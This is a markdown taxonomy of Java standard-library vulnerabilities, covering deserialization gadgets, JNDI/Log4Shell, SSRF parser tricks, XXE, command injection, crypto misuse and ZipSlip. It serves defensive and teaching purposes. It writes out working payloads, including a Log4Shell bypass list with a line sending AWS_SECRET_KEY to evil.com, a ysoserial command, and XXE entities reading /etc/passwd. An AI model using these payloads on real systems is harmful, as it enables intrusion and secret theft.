# Java Standard Library Security — Mutation/Variation Taxonomy

A comprehensive, generalized taxonomy of security vulnerabilities, design flaws, and exploitation techniques rooted in the Java language and its standard library (JDK). This document covers the JDK's core packages — `java.net`, `java.io`, `java.nio`, `java.lang`, `java.util`, `java.security`, `javax.crypto`, `javax.naming`, `javax.xml` — and the language-level design decisions that create systemic attack surfaces. Spring Framework is excluded (covered in `spring.md`).

---

## Classification Structure

Java's security surface is shaped by three foundational design philosophies that recur throughout this taxonomy:

1. **Specification Fidelity**: Java APIs faithfully implement standards (XML, ZIP, URL, serialization) even when those standards have dangerous defaults
2. **Backward Compatibility Preservation**: Insecure APIs and behaviors are maintained indefinitely to avoid breaking the vast Java ecosystem
3. **Low-Level Primitives Without High-Level Safe Abstractions**: The JDK provides powerful building blocks (cryptographic ciphers, process execution, XML parsing) but rarely provides "do the right thing by default" wrapper APIs

This taxonomy organizes the Java attack surface along three axes:

**Axis 1 — Mutation Target (Primary Structure):** The JDK package, class, or mechanism being attacked. This is the primary organizational axis, defining the 13 top-level categories (§1–§13).

**Axis 2 — Design Pattern (Cross-Cutting):** The meta-pattern that explains *why* the vulnerability exists at the language/library design level:

| Design Pattern | Code | Description |
|---|---|---|
| **Insecure Default** | D1 | API defaults to the less-secure option; security requires explicit opt-in |
| **Implicit Trust** | D2 | API treats all input (file paths, serialized data, XML, URLs) as trusted; no validation boundary |
| **Parser Differential** | D3 | Multiple APIs parse the same input differently (URL vs URI, File vs Path), creating bypass vectors |
| **Backward Compatibility Tax** | D4 | Insecure behavior preserved to avoid breaking existing code; deprecation without removal |
| **Abstraction Opacity** | D5 | API hides security-critical decisions from the developer; a single flag silently changes security posture |
| **Missing Safe Abstraction** | D6 | Low-level primitives exist but no high-level "just do it safely" API is provided |
| **Specification Faithfulness** | D7 | Implementing a standard faithfully introduces the standard's own vulnerabilities (XML XXE, ZIP paths) |

**Axis 3 — Impact:** The resulting security effect:

| Impact | Symbol |
|---|---|
| Remote Code Execution | **RCE** |
| Information Disclosure | **INFO** |
| Server-Side Request Forgery | **SSRF** |
| Path Traversal / File Access | **FS** |
| Denial of Service | **DoS** |
| Authentication / Authorization Bypass | **AUTHZ** |
| Cryptographic Weakness | **CRYPTO** |
| Data Corruption / Integrity Loss | **INTEGRITY** |

---

## §1. Serialization & Deserialization (`java.io.ObjectInputStream`)

Java's native serialization mechanism (`Serializable` interface + `ObjectInputStream`) is the single most dangerous API surface in the JDK. The serialized byte stream specifies which classes to instantiate, and the deserializer invokes constructors, magic methods, and finalizers on attacker-controlled types — making every deserialization endpoint an implicit code execution endpoint.

### §1-1. Magic Method Invocation During Deserialization

When `ObjectInputStream.readObject()` reconstructs an object, it automatically invokes lifecycle methods defined by the class. An attacker who controls the serialized stream controls which classes are instantiated and what values their fields hold, chaining these magic methods into arbitrary code execution.

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **`readObject()` gadget entry** | Class defines custom `readObject(ObjectInputStream)` that performs dangerous operations (HashSet/HashMap trigger `hashCode()`/`equals()` on deserialized keys) | Gadget class on classpath | RCE |
| **`readResolve()` substitution** | Class defines `readResolve()` returning a different object; attacker controls the substituted object's type | Singleton or cached-instance patterns | RCE |
| **`readExternal()` unvalidated** | `Externalizable` classes read data from the stream without type checking in their `readExternal()` method | Class implements `Externalizable` | RCE |
| **`finalize()` trigger** | Deserialized object's finalizer executes attacker-controlled operations when GC collects it; timing is non-deterministic | Gadget class with dangerous finalizer | RCE |
| **`validateObject()` bypass** | `ObjectInputValidation` registered during deserialization can be circumvented by completing the object graph before validation fires | Complex object graphs with circular references | RCE |

### §1-2. Gadget Chain Composition

Gadget chains exploit the composition of existing library classes — each class performs an individually benign operation, but chained together through serialization callbacks, they achieve arbitrary code execution.

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Pure JDK gadgets (JDK7u21)** | `LinkedHashSet` → `AnnotationInvocationHandler` → `Proxy` → `Templates.newTransformer()` → bytecode loading — no external libraries needed | JDK 7u21 or JDK 8u20 (bypasses 7u21 fix via `BeanContextSupport`) | RCE |
| **Commons Collections chains** | `InvokerTransformer` → `ChainedTransformer` → `Runtime.exec()` via `LazyMap`/`TransformedMap` trigger from `AnnotationInvocationHandler.invoke()` | Apache Commons Collections 3.x/4.x on classpath | RCE |
| **URLDNS detection chain** | `HashMap.readObject()` → `HashMap.hash()` → `URL.hashCode()` → DNS lookup to attacker domain — no RCE, used for blind detection | Any JDK; no external libraries | INFO |
| **JRMP client chain** | `RemoteObject.readObject()` triggers outbound JRMP connection to attacker-controlled RMI server, which responds with a second deserialization payload | RMI classes on classpath (always present in JDK) | RCE |
| **Dormant gadgets** | Gadget chains that become exploitable when a dependency is updated — ~26% of 533 analyzed dependencies contain patterns that activate chains upon minor code changes (USENIX 2025 research) | Dependency update bridges a gap in an incomplete chain | RCE |

**Example payload (URLDNS detection):**
```bash
java -jar ysoserial.jar URLDNS "http://canary.attacker.com" | base64
# Triggers DNS lookup when deserialized — confirms deserialization endpoint
# HashMap.readObject() → URL.hashCode() → InetAddress.getByName()
```

### §1-3. Deserialization Filter Bypass (JEP 290 / JEP 415)

JDK 9 introduced `ObjectInputFilter` (JEP 290) and JDK 17 added context-specific filter factories (JEP 415). These mechanisms allow restricting deserializable types, but they are opt-in and have known limitations.

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Filter not applied** | Application uses `ObjectInputStream` without setting any filter — the default remains "accept everything" | Any JDK version; developer must explicitly configure filters | RCE |
| **Denylist insufficiency** | Filter uses a denylist of known gadget classes; attacker uses a class not on the denylist | Incomplete denylist; new gadget classes discovered after filter deployment | RCE |
| **Nested deserialization bypass** | An allowed class internally deserializes data from one of its fields, bypassing the outer filter | Allowed class contains `ObjectInputStream` usage in `readObject()` | RCE |
| **Stream manipulation** | Crafted serialization stream evades filter by manipulating class descriptor ordering or using `TC_REFERENCE` back-references to already-resolved classes | CVE-2022-21248 | RCE |
| **Process-wide filter override** | `ObjectInputFilter.Config.setSerialFilter()` sets a JVM-wide filter, but it can only be set once — the first caller wins, and frameworks may set a permissive filter before the application's security filter | Framework initialization order dependency | RCE |

---

## §2. JNDI Injection (`javax.naming`)

Java Naming and Directory Interface (JNDI) is a lookup abstraction supporting LDAP, RMI, DNS, and CORBA backends. Any code path that passes attacker-controlled input to `InitialContext.lookup()` is exploitable because the lookup protocol can direct the client to load and execute remote classes.

### §2-1. Direct JNDI Lookup Injection

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **LDAP remote class loading** | `lookup("ldap://evil.com/x")` → LDAP server returns entry with `javaFactory` + `javaCodeBase` → JVM loads class from attacker URL | JDK < 8u191 (where `trustURLCodebase` defaults to true for LDAP) | RCE |
| **RMI remote class loading** | `lookup("rmi://evil.com/x")` → RMI registry returns `Reference` with remote codebase | JDK < 8u121 (where `trustURLCodebase` defaults to true for RMI) | RCE |
| **LDAP deserialization** | Even with `trustURLCodebase=false`, LDAP server returns `javaSerializedData` attribute containing serialized Java object → local deserialization with gadget chain | JDK 8u191+; gadget classes on local classpath | RCE |
| **LDAP reference factory abuse** | LDAP returns `javaFactory` pointing to a class already on the local classpath (e.g., `org.apache.naming.factory.BeanFactory` in Tomcat) that performs dangerous operations | Exploitable factory class on classpath (Tomcat, WildFly) | RCE |
| **DNS exfiltration** | `lookup("dns://attacker.com/x")` triggers DNS query; data embedded in subdomain label: `${jndi:dns://${env:SECRET}.attacker.com}` | Any JDK version; no RCE but exfiltrates data | INFO |

### §2-2. Log4Shell and Logging Framework JNDI

The most impactful JNDI exploitation pathway — Log4j2's message lookup feature processes `${jndi:...}` expressions in any logged string, turning every log statement into a potential RCE vector.

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Log4j2 message lookup (CVE-2021-44228)** | Log4j2 `StrSubstitutor` evaluates `${jndi:ldap://evil.com/x}` in log message parameters before level filtering | Log4j2 2.0-beta9 through 2.14.1 | RCE |
| **Bypass via nested lookup (CVE-2021-45046)** | `${${lower:j}ndi:...}` or `${${::-j}ndi:...}` evades pattern-based WAF filters while still being processed by Log4j2's recursive substitution | Log4j2 2.15.0 with non-default `PatternLayout` | RCE |
| **Recursive lookup DoS (CVE-2021-45105)** | Self-referencing lookup `${ctx:...}` causes infinite recursion → `StackOverflowError` | Log4j2 < 2.17.0 | DoS |
| **JDBC Appender JNDI (CVE-2021-44832)** | Attacker who can modify Log4j2 configuration inserts JDBC Appender with JNDI data source URL | Write access to log configuration file | RCE |
| **Log4j 1.x JMSAppender (CVE-2021-4104)** | Legacy Log4j 1.x `JMSAppender` performs JNDI lookup if configured with attacker-controlled topic/factory | Log4j 1.x with JMSAppender in configuration | RCE |
| **Logback insertFromJNDI (CVE-2021-42550)** | Logback configuration XML `<insertFromJNDI>` element triggers JNDI lookup during config parsing | Attacker can modify logback.xml or force config reload | RCE |

**Log4Shell WAF bypass catalog:**
```
${jndi:ldap://evil.com/x}                                    # Standard
${${lower:j}ndi:${lower:l}dap://evil.com/x}                 # lower() nesting
${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}          # Default value syntax
${j${env:X:-n}di:ldap://evil.com/x}                         # Env default fallback
${jndi:ldap://${env:AWS_SECRET_KEY}.evil.com/x}              # DNS exfiltration
```

### §2-3. JDK-Level JNDI Mitigations and Remaining Attack Surface

| JDK Version | Mitigation | Remaining Attack Surface |
|---|---|---|
| < 8u121 | None — RMI/LDAP remote classloading enabled by default | Full RCE via remote class loading |
| 8u121 | `com.sun.jndi.rmi.object.trustURLCodebase = false` | LDAP still allows remote classloading |
| 8u191 | `com.sun.jndi.ldap.object.trustURLCodebase = false` | Deserialization of serialized objects in LDAP response; local `Reference` factory classes |
| 11.0.1+ | Both properties default to false | Same as 8u191 — local deserialization and factory abuse |
| 17+ | JEP 415 filter factories available | Filters must be explicitly configured; bypass via local factory classes persists |

---

## §3. URL Parsing and Network Layer (`java.net`)

Java maintains two separate URL parsing implementations with different semantics: `java.net.URL` (JDK 1.0, lenient) and `java.net.URI` (JDK 1.4, stricter RFC 2396/3986). This duality, combined with `InetAddress` format flexibility and `HttpURLConnection` redirect behavior, creates a rich SSRF bypass surface.

### §3-1. URL vs URI Parser Differential

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **`getHost()` userinfo confusion** | `URL("http://evil.com\\@trusted.com/")` — `getHost()` behavior varies by JDK version for edge-case authority parsing | SSRF filter validates host using one parser, connection uses another | SSRF |
| **`URL.equals()` DNS side-effect** | `URL.equals()` and `URL.hashCode()` perform DNS resolution to compare hosts by IP — blocking, non-deterministic, vulnerable to DNS rebinding | URLs stored in `HashSet`/`HashMap`, or compared for equality | DoS, SSRF |
| **Multi-`@` ambiguity** | `http://a@b@evil.com/` — parsers disagree on which `@` separates userinfo from host (first-`@` vs last-`@` rule) | Validation uses URL, fetch uses URI (or vice versa) | SSRF |
| **Port parsing failure** | `http://127.0.0.1:11211:80/` — `getPort()` returns -1 (silent failure), `getHost()` returns `127.0.0.1` | Port-based filtering fails silently | SSRF |
| **Fragment handling difference** | `URL` strips fragments before network request; `URI` preserves them — SSRF filters that check the fragment-included URL miss the actual request target | Filter sees `http://evil.com/#http://trusted.com` | SSRF |

### §3-2. InetAddress Format Obfuscation

`InetAddress.getByName()` accepts multiple IP address representations that resolve to the same address but bypass string-matching blocklists.

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Hexadecimal IP** | `InetAddress.getByName("0x7f000001")` → 127.0.0.1 | Blocklist checks for "127.0.0.1" as string | SSRF |
| **Decimal (DWORD) IP** | `InetAddress.getByName("2130706433")` → 127.0.0.1 | Blocklist doesn't handle single-integer format | SSRF |
| **Octal IP** | `InetAddress.getByName("0177.0.0.01")` → 127.0.0.1 | Leading zeros interpreted as octal | SSRF |
| **Short-form IP** | `InetAddress.getByName("127.1")` → 127.0.0.1 | Fewer octets auto-expanded | SSRF |
| **IPv4-mapped IPv6** | `InetAddress.getByName("[::ffff:127.0.0.1]")` → 127.0.0.1 | Only IPv4 blocklist; no IPv6 mapping check | SSRF |
| **IPv6 zero compression** | `InetAddress.getByName("[::1]")` → localhost | Multiple equivalent representations via `::` compression | SSRF |

### §3-3. DNS Rebinding via Resolution TOCTOU

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Classic DNS rebinding** | First resolution (validation) returns public IP → passes check. Second resolution (connection) returns 127.0.0.1 → SSRF to internal network | Attacker-controlled DNS with low TTL; application resolves hostname twice | SSRF |
| **FTP PASV SSRF** | Java's FTP URL handler sends PASV command; attacker's FTP server returns internal IP:port in PASV response → Java connects to internal service | `URL.openConnection()` with `ftp://` scheme pointing to attacker's FTP server | SSRF |

### §3-4. HttpURLConnection Redirect Behavior

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Cross-protocol redirect** | HTTP→HTTPS or HTTPS→HTTP redirect followed automatically; validation only checked original URL | `HttpURLConnection.setFollowRedirects(true)` (default) | SSRF |
| **Redirect to file:// or gopher://** | Some JDK versions follow redirects to non-HTTP schemes | Older JDK versions with permissive redirect handling | FS, SSRF |
| **Redirect to internal host** | `http://evil.com` → 302 → `http://169.254.169.254/` — validation passes on `evil.com`, actual request hits metadata service | SSRF filter only validates initial URL | SSRF |
| **Default timeout absence** | `HttpURLConnection` has no default connect/read timeout — connection to non-responsive host hangs indefinitely | No explicit `setConnectTimeout()`/`setReadTimeout()` | DoS |

### §3-5. TLS Certificate Validation Bypass

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Empty TrustManager** | Developer implements `X509TrustManager` with empty `checkServerTrusted()` to bypass certificate errors | Self-signed certs in development; pattern copied to production | CRYPTO |
| **Global HostnameVerifier bypass** | `HttpsURLConnection.setDefaultHostnameVerifier((h,s) -> true)` — affects ALL connections in the JVM | Developer sets global default instead of per-connection | CRYPTO |
| **SSLContext.setDefault() poisoning** | `SSLContext.setDefault(insecureContext)` makes every SSL connection in the JVM trust all certificates | Library sets global SSLContext during initialization | CRYPTO |
| **Psychic Signatures (CVE-2022-21449)** | ECDSA verification in Java 15-17 accepts blank signatures `(r=0, s=0)` as valid for any message — can forge JWT, TLS certs, signed JARs | JDK 15, 16, 17 (before 17.0.3), 18 (before 18.0.1) | CRYPTO |

---

## §4. XML Processing (`javax.xml`)

Java's XML parsers are vulnerable to XXE (XML External Entity) injection by default. This is a deliberate design choice: the XML specification mandates external entity support, and Java's parsers implement the spec faithfully. There is no single kill switch — each parser type requires different configuration properties.

### §4-1. XXE — External Entity Injection

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **File read via SYSTEM entity** | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` — parser resolves entity by reading local file | Any XML parser with default configuration | FS, INFO |
| **SSRF via SYSTEM entity** | `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` — parser makes HTTP request to internal service | Default XML parser config; network access from server | SSRF |
| **jar: protocol SSRF (Java-specific)** | `<!ENTITY xxe SYSTEM "jar:http://evil.com/data.jar!/file.txt">` — Java downloads JAR, extracts entry, returns content | Java's jar: URL handler available in XML entity resolution | SSRF, INFO |
| **Parameter entity OOB exfiltration** | Two-stage attack: external DTD defines parameter entity that reads file, then sends content to attacker via URL | Outbound HTTP from server; error-based or OOB channel | INFO |
| **XInclude injection** | `<xi:include href="file:///etc/passwd"/>` in XML content — processed if XInclude-awareness is enabled | `setXIncludeAware(true)` or default on some parsers | FS, INFO |

**Vulnerable parser defaults:**

| Parser Class | XXE by Default | Hardening Property |
|---|---|---|
| `DocumentBuilderFactory` | Yes | `disallow-doctype-decl = true` |
| `SAXParserFactory` | Yes | `external-general-entities = false` + `external-parameter-entities = false` |
| `XMLInputFactory` (StAX) | Yes | `SUPPORT_DTD = false` + `IS_SUPPORTING_EXTERNAL_ENTITIES = false` |
| `TransformerFactory` | Yes | `ACCESS_EXTERNAL_DTD = ""` + `ACCESS_EXTERNAL_STYLESHEET = ""` |
| `SchemaFactory` | Yes | `ACCESS_EXTERNAL_DTD = ""` + `ACCESS_EXTERNAL_SCHEMA = ""` |
| `Unmarshaller` (JAXB) | Yes (via SAX) | Provide hardened `XMLInputFactory` as source |

**Critical misconception:** `XMLConstants.FEATURE_SECURE_PROCESSING` does **NOT** disable XXE — it only limits entity expansion depth and total entity size. It is a DoS mitigation, not an XXE mitigation.

### §4-2. Billion Laughs / Entity Expansion DoS

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Exponential entity expansion** | Nested entity definitions creating 10^10 expansions from a small document | No entity expansion limit configured (default: 64000 in JDK 7u45+) | DoS |
| **Quadratic blowup** | Single entity with 50KB value referenced 50,000 times — bypasses nesting depth limits | Entity expansion limit set but no total size limit | DoS |
| **Parameter entity recursion** | DTD-only expansion via `%entity;` references — triggers during DTD parsing before document processing | No parameter entity size limit | DoS |

### §4-3. XSLT Code Execution

`TransformerFactory` can process XSLT stylesheets that invoke arbitrary Java methods via Xalan's extension function mechanism.

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Runtime.exec() via Xalan extension** | XSLT stylesheet uses `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` then calls `rt:exec()` | Xalan (default XSLT processor in JDK), extension functions enabled | RCE |
| **Arbitrary object instantiation** | `java:java.net.URL.new('http://evil.com/')` in XSLT creates objects via Xalan Java extension | Extension functions not disabled | RCE, SSRF |
| **document() function SSRF** | `document('http://internal:8080/')` in XSLT fetches external resources | `ACCESS_EXTERNAL_STYLESHEET` not restricted | SSRF |

### §4-4. XPath Injection

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Tautology injection** | `//users/user[@name='' or '1'='1']` — returns all user nodes | User input concatenated into XPath expression | AUTHZ, INFO |
| **Boolean-based extraction** | `substring(//users/user[1]/@password,1,1)='a'` — one-bit-at-a-time secret extraction | Observable difference between match and no-match | INFO |
| **Union injection** | `'] | //admin/credentials | //x[@a='` — injects additional XPath expressions via union operator | Input inserted within predicate brackets | INFO |

---

## §5. Process Execution (`java.lang.Runtime`, `java.lang.ProcessBuilder`)

Java provides no safe command execution API. `Runtime.exec(String)` uses `StringTokenizer` for argument splitting (no quoting, no escaping), and `ProcessBuilder` requires manual argument array construction with no built-in escaping utilities.

### §5-1. Runtime.exec() Argument Parsing

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Shell metacharacter injection** | `Runtime.exec(new String[]{"/bin/sh", "-c", "cmd " + userInput})` — shell interprets `;`, `|`, `&&`, `` ` ``, `$()` in userInput | Command string passed to shell interpreter | RCE |
| **Argument injection (no shell)** | `Runtime.exec(new String[]{"git", "clone", userInput})` where userInput = `--upload-pack=evil_command` — target program interprets injected flags | Target program accepts dangerous flags | RCE |
| **Windows cmd.exe implicit invocation** | `Runtime.exec("script.bat " + userInput)` — Windows invokes `cmd.exe` for `.bat`/`.cmd` files, enabling `&`, `|`, `>` metacharacters | Windows OS; batch file execution | RCE |
| **StringTokenizer splitting confusion** | `Runtime.exec("echo \"hello world\"")` → splits to `["echo", "\"hello", "world\""]` — quotes are NOT interpreted | Single-string overload of `exec()` | RCE |

### §5-2. ProcessBuilder Environment and Configuration

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **LD_PRELOAD injection** | `pb.environment().put("LD_PRELOAD", "/evil.so")` — force-loads attacker's shared library into child process | Linux; attacker controls environment variables | RCE |
| **PATH manipulation** | Prepending attacker-controlled directory to `PATH` → child process resolves executables from attacker's directory first | Environment not sanitized before process creation | RCE |
| **CLASSPATH injection** | Setting `CLASSPATH` to include attacker-controlled directory → Java child process loads classes from attacker's path | Java subprocess launched via ProcessBuilder | RCE |
| **http_proxy SSRF** | Setting `http_proxy`/`https_proxy` → all HTTP traffic from child process routed through attacker's proxy | Child process makes HTTP requests | SSRF, INFO |
| **Stdout/stderr deadlock** | Not consuming stdout/stderr → OS pipe buffer (64KB) fills → child blocks on write → parent waits for child → deadlock | No stream consumption or redirect configured | DoS |

---

## §6. Cryptographic API Misuse (`javax.crypto`, `java.security`)

Java's cryptographic APIs provide low-level building blocks but no high-level "just encrypt this safely" API. The developer must correctly compose cipher, mode, padding, IV generation, key derivation, and authentication — and the defaults for each component are insecure.

### §6-1. Cipher Mode and Padding Defaults

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **ECB mode default** | `Cipher.getInstance("AES")` silently defaults to `AES/ECB/PKCS5Padding` — identical plaintext blocks produce identical ciphertext blocks (deterministic encryption) | Algorithm specified without explicit mode | CRYPTO |
| **CBC without authentication** | `Cipher.getInstance("AES/CBC/PKCS5Padding")` provides confidentiality but no integrity — vulnerable to padding oracle attacks (Vaudenay) | `BadPaddingException` observable by attacker (timing, error message, HTTP status) | CRYPTO, INFO |
| **Static/zero IV** | `new IvParameterSpec(new byte[16])` — fixed IV with CTR/GCM mode enables complete key recovery if key is reused | Developer initializes IV to all-zeros or a constant | CRYPTO |
| **GCM nonce reuse** | Same nonce + key in AES-GCM: attacker recovers GHASH authentication key via polynomial GCD in GF(2^128), enabling tag forgery for arbitrary messages | Random 96-bit nonce with birthday collision after ~2^48 messages; or counter that resets on restart | CRYPTO |

**Example — the silent ECB default:**
```java
Cipher cipher = Cipher.getInstance("AES");
// Equivalent to Cipher.getInstance("AES/ECB/PKCS5Padding")
// cipher.getAlgorithm() returns "AES" — the actual mode is hidden
```

### §6-2. Random Number Generation

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **`java.util.Random` for security** | 48-bit LCG state recoverable from two consecutive `nextInt()` outputs by brute-forcing 16 lower bits (65536 attempts) | `Random` used for tokens, session IDs, nonces, CSRF tokens | CRYPTO, AUTHZ |
| **`ThreadLocalRandom` for security** | Non-cryptographic PRNG with recoverable internal state — same weakness as `Random` | Used in security-sensitive contexts | CRYPTO |
| **SHA1PRNG setSeed() trap** | `SecureRandom.getInstance("SHA1PRNG"); sr.setSeed(System.currentTimeMillis())` — calling `setSeed()` before any output REPLACES entropy source entirely | `setSeed()` called before `nextBytes()` with predictable seed | CRYPTO |
| **`getInstanceStrong()` blocking** | `SecureRandom.getInstanceStrong()` uses `/dev/random` on Linux — blocks when entropy pool is depleted, causing DoS in containers/VMs | Docker containers without hardware RNG; early boot | DoS |

### §6-3. Key Derivation Weaknesses

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Low PBKDF2 iteration count** | `new PBEKeySpec(password, salt, 1000, 256)` — NVIDIA RTX 4090 computes ~8M PBKDF2-SHA256 hashes/sec at 1000 iterations | Iteration count below OWASP 2023 minimum (600,000 for SHA-256) | CRYPTO |
| **Static/shared salt** | Same salt for all users → attacker builds one rainbow table for all passwords | Hardcoded salt or salt derived from non-unique value | CRYPTO |
| **Password as String** | `new String(password)` — immutable, interned, lives in memory until GC; visible in heap dumps, core dumps, swap | Passwords handled as `String` instead of `char[]` | INFO |

### §6-4. Timing Side-Channels

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **`String.equals()` for token comparison** | `expectedToken.equals(userToken)` — short-circuits on first mismatch, leaking token length and prefix | HMAC, API key, or session token comparison | CRYPTO, AUTHZ |
| **`Arrays.equals()` for MAC verification** | `Arrays.equals(expectedMac, providedMac)` — same short-circuit behavior | MAC or hash comparison | CRYPTO |
| **`MessageDigest.isEqual()` (safe)** | Constant-time comparison — accumulates XOR differences, single comparison at end | Use this for all cryptographic comparisons | — |

---

## §7. File System Operations (`java.io.File`, `java.nio.file`)

### §7-1. Path Traversal

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **`getAbsolutePath()` validation bypass** | `new File(base, "../../../etc/shadow").getAbsolutePath()` returns `/var/app/uploads/../../../etc/shadow` — `startsWith()` check passes because `..` is NOT resolved | Developer uses `getAbsolutePath()` instead of `getCanonicalPath()` | FS |
| **`Path.normalize()` vs `toRealPath()` symlink bypass** | `normalize()` resolves `..` lexically but does NOT resolve symlinks — `/uploads/reports/../secret` normalizes to `/uploads/secret` even if `reports` is a symlink | Symlink present in path; `normalize()` used instead of `toRealPath()` | FS |
| **Windows alternate streams** | `filename.txt::$DATA` — NTFS alternate data stream; bypasses extension-based filters | Windows OS; extension validation only | FS |
| **Windows reserved device names** | `CON`, `NUL`, `COM1`, `LPT1` — special device names cause unexpected behavior | Windows OS; filename not validated against reserved names | DoS |
| **Null byte injection (pre-JDK 7u40)** | `"file.txt\0../../etc/passwd"` — Java sees full string, native `open()` truncates at null | JDK < 7u40 | FS |

### §7-2. Symbolic Link Following

Nearly every `java.nio.file.Files` method follows symlinks by default. Methods that read/write file content (`readAllBytes`, `write`, `readString`, `newInputStream`, `newOutputStream`) do NOT accept `LinkOption.NOFOLLOW_LINKS`.

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Symlink-through-read** | Attacker creates symlink `uploads/doc → /etc/shadow`; `Files.readAllBytes(uploads/doc)` reads shadow file | Writable upload directory; no symlink check | INFO |
| **Symlink-through-write** | Attacker creates symlink `uploads/report → /etc/crontab`; `Files.write(uploads/report, data)` overwrites crontab | Writable directory; no symlink check | RCE |
| **Directory symlink** | `uploads/` itself is symlinked to `/etc/`; all operations within `uploads/` affect `/etc/` | Parent directory is a symlink | FS, RCE |

### §7-3. TOCTOU Race Conditions

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Exists-then-create race** | `Files.exists(path)` → attacker replaces with symlink → `Files.write(path, data)` writes through symlink | Gap between existence check and file creation | FS, RCE |
| **Permission-then-open race** | `file.canRead()` → attacker changes file → `new FileInputStream(file)` opens different file | Gap between permission check and file open | INFO |
| **Symlink-then-read race** | `Files.isSymbolicLink(path)` returns false → attacker replaces regular file with symlink → `Files.readAllBytes(path)` reads symlink target | Gap between symlink check and file read | INFO |

**Mitigation:** `StandardOpenOption.CREATE_NEW` atomically creates a file, failing if it already exists — eliminates the create race.

### §7-4. Temporary File Security

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **`File.createTempFile()` default permissions** | Linux: created with umask-dependent permissions (often 0644 = world-readable) — any local user can read the temp file | JDK < 18; Linux with default umask 022 | INFO |
| **`deleteOnExit()` memory leak** | Registers path in `DeleteOnExitHook.files` (never trimmed until shutdown) — long-running servers accumulate unbounded memory | Server creating thousands of temp files over its lifetime | DoS |
| **Predictable temp file names** | Pre-JDK 7 used counter + `currentTimeMillis()` for temp file names — predictable enough for symlink races | Legacy JDK versions | FS |

---

## §8. Archive Processing (`java.util.zip`)

### §8-1. ZipSlip — Directory Traversal via Entry Names

`ZipEntry.getName()` returns the raw entry name from the ZIP header, which can contain `../` traversal sequences. Java's ZIP API performs no validation.

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Classic path traversal** | Entry named `../../../etc/cron.d/backdoor` — extracted to arbitrary filesystem location | No canonical path validation during extraction | RCE, FS |
| **Absolute path entry** | Entry named `/etc/cron.d/backdoor` — extracted to absolute path, ignoring destination directory | No check for leading `/` | RCE, FS |
| **Backslash traversal (Windows)** | Entry named `..\..\..\..\windows\system32\config\sam` — uses Windows path separator | Windows OS; no path separator normalization | FS |
| **JAR/WAR entry traversal** | Malicious entry in JAR/WAR file (`JarEntry` extends `ZipEntry`) — extracted during deployment to overwrite application files | Build tool or app server extracts without validation | RCE |

**CVEs:** CVE-2018-1263 (Spring Integration Zip), CVE-2018-8009 (Apache Hadoop), CVE-2018-1002200 (plexus-archiver), CVE-2023-42503 (Apache Commons Compress).

### §8-2. Decompression Bomb (ZIP Bomb)

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Recursive ZIP bomb** | ZIP contains nested ZIPs — 5 layers × 16 files/layer = 1M bottom files × 4.3GB each = 4.5 PB | Application recursively extracts nested archives | DoS |
| **Flat (non-recursive) bomb** | Single ZIP with overlapping local file headers referencing same compressed block — 10MB → 281TB, no recursion needed | Bypasses "don't recurse" defense | DoS |
| **Single-entry bomb** | 1GB of zeros → ~1MB compressed; attacker sends 10MB ZIP → application allocates 10GB in memory | No decompressed size limit | DoS |
| **Falsified size headers** | `ZipEntry.getSize()` returns value from attacker-controlled header — pre-allocating `new byte[entry.getSize()]` with size = `Integer.MAX_VALUE` causes OOM | Size used for buffer allocation without validation | DoS |

---

## §9. Reflection and Class Loading (`java.lang.reflect`, `java.lang.ClassLoader`)

### §9-1. Reflection Access Control Bypass

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **`setAccessible(true)` bypass** | `Field.setAccessible(true)` / `Method.setAccessible(true)` bypasses `private`/`protected` access modifiers entirely | No SecurityManager; or `--add-opens` flags on command line | AUTHZ, RCE |
| **Module system bypass via `--add-opens`** | JDK 9+ JPMS restricts deep reflection, but `--add-opens java.base/java.lang=ALL-UNNAMED` re-enables it — commonly added by frameworks | Frameworks (Spring, Hibernate) require `--add-opens` for operation | RCE |
| **`sun.misc.Unsafe` direct memory** | `Unsafe.allocateInstance()` creates objects without calling constructors; `Unsafe.putInt/putObject` writes to arbitrary memory offsets | Unsafe obtained via reflection on its `theUnsafe` field | RCE |
| **`MethodHandles.privateLookupIn()` escalation** | JDK 9+ `MethodHandles.Lookup` with `PRIVATE` access can invoke any method — equivalent to `setAccessible(true)` through the method handle API | Lookup obtained via `privateLookupIn()` in the same module | RCE |

### §9-2. ClassLoader Exploitation

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **`URLClassLoader` remote loading** | `new URLClassLoader(new URL[]{new URL("http://evil.com/")})` → `loadClass("Exploit")` loads and executes attacker's class | URL-based class loading enabled | RCE |
